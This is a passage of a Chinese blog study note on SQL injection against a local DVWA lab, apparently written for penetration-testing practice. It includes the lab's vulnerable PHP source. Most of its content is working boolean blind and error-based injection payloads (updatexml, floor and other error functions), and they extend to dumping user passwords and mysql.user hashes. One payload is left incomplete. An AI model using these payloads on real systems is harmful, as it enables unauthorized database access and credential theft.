+<h2 id="黑盒情况下进行布尔盲注入"><a href="#黑盒情况下进行布尔盲注入" class="headerlink" title="黑盒情况下进行布尔盲注入"></a>黑盒情况下进行布尔盲注入</h2><p>步骤：</p>
+<p>​	我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。</p>
+<h3 id="布尔盲注入查询长度"><a href="#布尔盲注入查询长度" class="headerlink" title="布尔盲注入查询长度"></a>布尔盲注入查询长度</h3><p>​	通过构造如下sql语句进行数据库长度的查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,1,0)-- </span><br></pre></td></tr></table></figure>
+
+<p>判断出长度为4</p>
+<h3 id="布尔盲注入判断库名"><a href="#布尔盲注入判断库名" class="headerlink" title="布尔盲注入判断库名"></a>布尔盲注入判断库名</h3><p>这一步操作其实就是通过遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</span><br></pre></td></tr></table></figure>
+
+<p>与语句进行整合判断出是否返回1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- </span><br></pre></td></tr></table></figure>
+
+<p>当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作</p>
+<p>带有构造sql语句的url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+
+<p>再burp里面抓包然后送入intruder</p>
+<p>先清除变量 然后再将数字和字母设为变量 攻击类型选择 <code>cluster bomb</code></p>
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232208426-323266936.png"></p>
+<p>然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！</p>
+<p>获得的数据库名为 dvwa</p>
+<p>接着我们通过库名来获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- </span><br></pre></td></tr></table></figure>
+
+<p>同样通过burp进行抓包</p>
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232216969-1395888437.png"></p>
+<p>获取到表名guestbook</p>
+<p>然后获取字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- </span><br></pre></td></tr></table></figure>
+
+<p>同样我们用burp进行爆破</p>
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232228021-2082015114.png"></p>
+<p>得到字段名为<code>login  password</code>等<img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232302275-1126861267.png"></p>
+<p>获得完</p>
+<p>字段后 我们可以进一步获取字段内容【账号+密码】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232253962-1018686498.png"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​	顾名思义报错注入就是指数据库显示错误，比如sql语法错误</p>
+<p>一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 <code>mysql_error()</code>函数</p>
+<p>​	如果在查询注入时候会有报错信息返回，可以采用报错注入</p>
+<h3 id="报错注入分析"><a href="#报错注入分析" class="headerlink" title="报错注入分析"></a>报错注入分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment"># get传入id 字符串型</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="comment"># mysqli_error 函数返回错误信息</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h3><p>​	在输入框输入报错的sql拼接语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and info()-- </span><br></pre></td></tr></table></figure>
+
+<p>它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info()</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入获取敏感信息"><a href="#报错注入获取敏感信息" class="headerlink" title="报错注入获取敏感信息"></a>报错注入获取敏感信息</h3><p>​	通过构造sql语句，返回带有数据库敏感信息的错误信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- </span><br></pre></td></tr></table></figure>
+
+<p>注意：这里为什么要用<code>updatexml()</code>呢，首先要先了解这个函数</p>
+<blockquote>
+<p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。</p>
+<p>为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的<code>错误信息返回</code></p>
+<blockquote>
+<p>但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32</p>
+<p>字符就要采用字符串截取方法。每次获取 32 个字符串的长度。</p>
+<p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);</span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<h3 id="在黑盒模式下进行报错注入"><a href="#在黑盒模式下进行报错注入" class="headerlink" title="在黑盒模式下进行报错注入"></a>在黑盒模式下进行报错注入</h3><p>​	流程还是根之前一样 库名-》表名-》字段-》字段内容</p>
+<h4 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- </span><br></pre></td></tr></table></figure>
+
+<h4 id="获取表名-这次用floor报错，floor报错不会出现长度问题"><a href="#获取表名-这次用floor报错，floor报错不会出现长度问题" class="headerlink" title="获取表名 这次用floor报错，floor报错不会出现长度问题"></a>获取表名 这次用floor报错，floor报错不会出现长度问题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- </span><br></pre></td></tr></table></figure>
+
+<p>获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users</p>
+<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>获取users第一个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from(select count(*),,))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p> 获取账号密码</p>
+<p>获取账号和密码需要root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232408409-1564081412.jpg"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/" title="渗透学习记录OS" target="_blank" rel="external">https://sfyyh.github.io/2022/12/25/渗透学习记录OS/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/SFYYH" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/SFYYH" target="_blank"><span class="text-dark">山城冰荔枝</span><small class="ml-1x">Web Developer &amp; Designer</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/08/03/hello-world/" title="Hello World"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="qq,wechat" data-mobile-sites="qq"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/SFYYH" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/SFYYH" target="_blank"> colincora </a>base on <a href="https://sfyyh.github.io/" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
